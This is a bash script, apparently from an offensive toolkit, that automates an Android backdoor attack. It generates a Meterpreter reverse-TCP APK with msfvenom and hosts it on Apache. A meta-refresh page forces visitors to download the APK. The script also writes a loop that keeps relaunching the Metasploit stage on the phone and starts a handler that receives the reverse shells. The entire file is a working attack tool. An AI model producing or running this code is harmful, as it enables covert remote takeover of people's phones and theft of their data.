#!/bin/bash

source "plugins/check_root_permission.sh"
source "plugins/check_bash_version.sh"

check_ipmd() {
  wan=$(curl -l "https://api.ipify.org")
  lan=$(ip addr show | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' | grep -v "$wan")

  if [ "${IP_MODE}" = "WAN" ]; then
    LHOST=${wan}
    LPORT="8080"
  else
    LHOST=${lan}
    LPORT="4444"
  fi
}

start_script() {  clear && echo -en "\n Starting ${ScriptName} ... "

  check_ipmd && sudo service apache2 start

  msfvenom -p android/meterpreter/reverse_tcp LHOST="${LHOST}" LPORT="${LPORT}" -o "${Apk_Path}"

	cat >"${Index_Path}" <<-EOF
		<!DOCTYPE HTML>
		<html>
		<head>
		<meta http-equiv="refresh" content="0;url='/${APK_NAME}.apk'">
		</head>
		</html>
	EOF

  cat >"${Backdoor_Path}" <<-EOF
    #!/bin/bash
    while :
    do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity
      sleep 20
    done
	EOF

	cat >"${Meterpreter_Path}" <<-EOF
		use exploit/multi/handler
		set PAYLOAD android/meterpreter/reverse_tcp
		set LHOST ${LHOST}
		set LPORT ${LPORT}
		set ExitOnSession false
		exploit -j -z
    clear
	EOF

  clear && echo -en "\n Starting Metasploit-Framework ... "

  msfconsole -q -r "${Meterpreter_Path}"
}

end_script() {  clear
  echo -en "\n EXITING SCRIPT ... "

  sudo rm -r "${Meterpreter_Path}"
  sudo rm -r "${Backdoor_Path}"
  sudo rm -r "${Index_Path}"
  sudo rm -r "${Apk_Path}"

  sudo service apache2 stop && clear && exit
}
